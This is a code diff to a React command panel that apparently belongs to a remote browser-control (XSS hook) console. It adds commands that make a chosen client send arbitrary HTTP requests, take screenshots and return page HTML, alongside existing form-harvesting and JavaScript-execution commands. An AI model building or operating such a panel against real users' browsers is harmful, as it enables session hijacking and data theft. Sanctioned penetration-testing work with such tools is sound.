@@ -8,6 +8,12 @@ const CommandPanel = ({ selectedClient, onCommandResult, projectId }) => {
   const [selectedCommand, setSelectedCommand] = useState('');
   const [customCode, setCustomCode] = useState('');
   const [domSelector, setDomSelector] = useState('');
+  const [xhrConfig, setXhrConfig] = useState({
+    method: 'GET',
+    url: '',
+    headers: '{}',
+    data: ''
+  });
   const { sendCommandToAll, sendCommandToTarget, loading } = useApi();
 
   const commandOptions = [
@@ -18,7 +24,10 @@ const CommandPanel = ({ selectedClient, onCommandResult, projectId }) => {
     { value: COMMAND_TYPES.FORMS, label: '获取表单信息' },
     { value: COMMAND_TYPES.USER_AGENT, label: '获取用户代理' },
     { value: COMMAND_TYPES.DOM, label: '获取 DOM 元素' },
-    { value: COMMAND_TYPES.EVAL, label: '执行 JavaScript' }
+    { value: COMMAND_TYPES.EVAL, label: '执行 JavaScript' },
+    { value: COMMAND_TYPES.XHR, label: 'HTTP 请求' },
+    { value: COMMAND_TYPES.SCREENSHOT, label: '页面截图' },
+    { value: COMMAND_TYPES.HTML, label: '获取页面 HTML' }
   ];
 
   const getCommandArgs = () => {
@@ -30,6 +39,22 @@ const CommandPanel = ({ selectedClient, onCommandResult, projectId }) => {
     
     if (selectedCommand === COMMAND_TYPES.DOM && domSelector.trim()) {
       args.selector = domSelector.trim();
+    }
+    
+    if (selectedCommand === COMMAND_TYPES.XHR) {
+      args.method = xhrConfig.method;
+      args.url = xhrConfig.url;
+      args.async = true;
+      
+      try {
+        args.headers = JSON.parse(xhrConfig.headers);
+      } catch (e) {
+        args.headers = {};
+      }
+      
+      if (xhrConfig.data.trim()) {
+        args.data = xhrConfig.data.trim();
+      }
     }
     
     return args;
@@ -139,6 +164,47 @@ const CommandPanel = ({ selectedClient, onCommandResult, projectId }) => {
           />
         )}
 
+        {selectedCommand === COMMAND_TYPES.XHR && (
+          <div className="command-panel__xhr-config">
+            <div className="command-panel__xhr-row">
+              <Select
+                label="HTTP 方法"
+                value={xhrConfig.method}
+                onChange={(e) => setXhrConfig(prev => ({...prev, method: e.target.value}))}
+                options={[
+                  {value: 'GET', label: 'GET'},
+                  {value: 'POST', label: 'POST'},
+                  {value: 'PUT', label: 'PUT'},
+                  {value: 'DELETE', label: 'DELETE'}
+                ]}
+              />
+              <Input
+                label="请求URL"
+                value={xhrConfig.url}
+                onChange={(e) => setXhrConfig(prev => ({...prev, url: e.target.value}))}
+                placeholder="https://example.com/api/data"
+                required
+              />
+            </div>
+            <Input
+              label="请求头 (JSON格式)"
+              value={xhrConfig.headers}
+              onChange={(e) => setXhrConfig(prev => ({...prev, headers: e.target.value}))}
+              placeholder='{"Content-Type": "application/json"}'
+            />
+            <div className="command-panel__code-input">
+              <label className="command-panel__label">请求数据</label>
+              <textarea
+                className="command-panel__textarea"
+                value={xhrConfig.data}
+                onChange={(e) => setXhrConfig(prev => ({...prev, data: e.target.value}))}
+                placeholder="POST/PUT请求的数据内容..."
+                rows={3}
+              />
+            </div>
+          </div>
+        )}
+
         <div className="command-panel__actions">
           <Button
             variant="primary"
@@ -155,6 +221,12 @@ const CommandPanel = ({ selectedClient, onCommandResult, projectId }) => {
               setSelectedCommand('');
               setCustomCode('');
               setDomSelector('');
+              setXhrConfig({
+                method: 'GET',
+                url: '',
+                headers: '{}',
+                data: ''
+              });
             }}
             disabled={loading}
           >
